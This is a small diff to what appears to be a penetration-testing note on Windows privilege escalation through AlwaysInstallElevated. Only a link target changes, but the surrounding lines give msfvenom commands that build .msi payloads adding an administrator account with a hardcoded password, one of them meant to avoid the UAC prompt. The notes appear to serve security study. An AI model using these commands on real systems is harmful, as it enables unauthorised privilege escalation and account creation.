@@ -17,7 +17,7 @@ PS > Invoke-AllChecks
 ```
 ## Outputs
 - #AlwaysInstallElevated 
-	Use [[Metasploit#Generate Payload]] to create `.msi` reverse-shell and send it with [[Client-Server Connection]]
+	Use [[Metasploit#Generate Payload]] to create `.msi` reverse-shell and send it with [[File Transfer]]
 ```shell-session
 $ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
 $ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
